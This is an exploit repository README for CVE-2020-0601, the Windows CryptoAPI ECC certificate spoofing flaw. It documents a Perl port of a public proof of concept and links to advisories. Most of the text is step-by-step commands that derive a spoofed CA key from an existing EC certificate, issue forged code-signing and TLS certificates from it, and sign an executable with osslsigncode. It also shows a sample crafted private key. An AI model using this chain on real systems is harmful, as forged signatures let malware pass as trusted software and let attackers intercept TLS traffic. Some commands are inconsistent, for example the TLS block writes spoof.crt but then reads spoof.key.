CVE-2020-0601
==================

![](https://github.com/nu11secur1ty/Windows10Exploits/blob/master/Undefined/CVE-2020-0601/WORK/cve-2020-0601_work/Perl/logo/RE1Mu3b.png)


This is the Perl version of the script main.rb published from ollypwn https://github.com/ollypwn/CVE-2020-0601 is here:
    
    
- Info: 

https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0601

https://www.guru3d.com/news-story/microsoft-patches-crypt32-dll-vulnerability-that-allows-certificate-spoofing.html

https://kb.cert.org/vuls/id/849224/

https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF

----------------------------------------------------------------------------------------------------

https://www.virustotal.com/gui/file/95597ed5ed579d4fe1e9a2177c29178038e4f837998bc058c94ede6ec55b7547/details

https://tehtris.com/en/cve-2020-0601-vulnerability-in-the-cryptoapi-of-windows-crypt32-dll/

--------------------------------------------------------------------------------------------------------


# Microsoft Servers: Create ECC CSR and Install ECC SSL Certificate

https://www.digicert.com/ecc-csr-creation-ssl-installation-microsoft.htm



----------------------------------------------------------------------------------------------------------

Need to install:
==================

```bash
cpan -i Crypt::OpenSSL::X509
cpan -i Crypt::PK::ECC
```
# Example of a number of the ECC Certificate:
![](https://github.com/nu11secur1ty/Windows10Exploits/blob/master/Undefined/CVE-2020-0601/WORK/cve-2020-0601_work/Perl/logo/microsoft-server-ecc-ssl-certificate-installation-10.jpg)

-------------------------------------------------------------------------------
# USAGE ON Linux default:

- Create an EC certificate using OpenSSL for testing
```bash
openssl ecparam -genkey -name prime256v1 -out key.pem
openssl req -new -sha256 -key key.pem -out csr.csr
openssl req -x509 -sha256 -days 365 -key key.pem -in csr.csr -out certificate.pem
openssl req -in csr.csr -text -noout | grep -i "Signature.*SHA256" && echo "All is well" || echo "This certificate will stop working in 2017! You must update OpenSSL to generate a widely-compatible certificate"
```

# Usage on Linux(mode):
```bash
perl shibazuki.pl ./EC.cer > spoof.key

openssl req -new -x509 -key spoof.key -out spoof.crt

openssl ecparam -name secp384r1 -genkey -noout -out cert.key

openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs

openssl x509 -req -in cert.csr -CA spoof.crt -CAkey spoof.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs

openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoof.crt -name "Code Signing" -out cert.p12

osslsigncode sign -pkcs12 cert.p12 -n "Signed by nu11secur1ty" -in 7z1900-x64.exe -out 7z1900-x64_signed.exe

```
# SSL/TLS
```bash
perl shibazuki.pl ./EC.cer > spoof.crt

openssl req -new -x509 -key spoof.key -out spoof.crt

openssl ecparam -name secp384r1 -genkey -noout -out cert.key

openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls

openssl x509 -req -in cert.csr -CA spoof.crt -CAkey spoof.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls

```



- Create spoof certificate
```bash
perl shibazuki.pl certificate.pem 
# Export
perl shibazuki.pl certificate.pem > spoofEC.crt
```
- Output should be

```bash
-----BEGIN EC PRIVATE KEY-----
MIIBMgIBAQQBAaCB4zCB4AIBATAsBgcqhkjOPQEBAiEA/////wAAAAEAAAAAAAAA
AAAAAAD///////////////8wRAQg/////wAAAAEAAAAAAAAAAAAAAAD/////////
//////wEIFrGNdiqOpPns+u9VXaYhrxlHQawzFOw9jvOPD4n0mBLBEEEdFZqveAI
TciI3055WctITTdkFuNK/2Rc+uCJNK+xFcDOFuSjbFzQ/6oSwlYwaceemvGBdLcJ
KqCO1KEZz+oQaQIhAP////8AAAAA//////////+85vqtpxeehPO5ysL8YyVRAgEB
oUQDQgAEdFZqveAITciI3055WctITTdkFuNK/2Rc+uCJNK+xFcDOFuSjbFzQ/6oS
wlYwaceemvGBdLcJKqCO1KEZz+oQaQ==
-----END EC PRIVATE KEY-----
```

